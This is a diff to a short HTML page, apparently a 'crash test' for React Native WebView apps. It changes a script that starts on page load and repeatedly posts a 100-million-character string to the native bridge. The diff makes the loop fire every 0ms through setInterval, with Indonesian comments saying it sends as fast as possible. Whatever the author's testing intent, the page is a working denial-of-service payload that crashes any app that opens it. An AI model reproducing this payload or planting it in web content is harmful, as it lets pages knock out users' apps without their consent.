@@ -2,13 +2,13 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>ReactNativeWebView Crash Test - Auto Nuclear</title>
+<title>ReactNativeWebView Crash Test - Auto Nuclear 0ms (detik)</title>
 <style>
 body { font-family: sans-serif; padding: 20px; background: #000; color: #0f0; }
 </style>
 </head>
 <body>
-<h2>🚨 Auto Nuclear Mode Activated</h2>
+<h2>🚨 Auto Nuclear Mode 0ms Activated</h2>
 <pre id="log"></pre>
 
 <script>
@@ -27,22 +27,18 @@ function post(msg) {
 }
 
 function sendLongString() {
-    const payload = "A".repeat(100_000_000);
+    const payload = "A".repeat(100_000_000); // 100 juta karakter
     post(payload);
 }
 
-let nuclearActive = true;
+let nuclearTimer = null;
 
 function startNuclear() {
-    log("🚨 Nuclear Mode started automatically!");
-    (function loop() {
-        if (!nuclearActive) return;
-        sendLongString();
-        requestAnimationFrame(loop); // tanpa jeda
-    })();
+    log("🚨 Nuclear Mode 0ms started automatically!");
+    nuclearTimer = setInterval(sendLongString, 0); // kirim secepat mungkin
 }
 
-// Langsung mulai saat halaman dibuka
+// Mulai otomatis saat halaman dibuka
 startNuclear();
 </script>
 
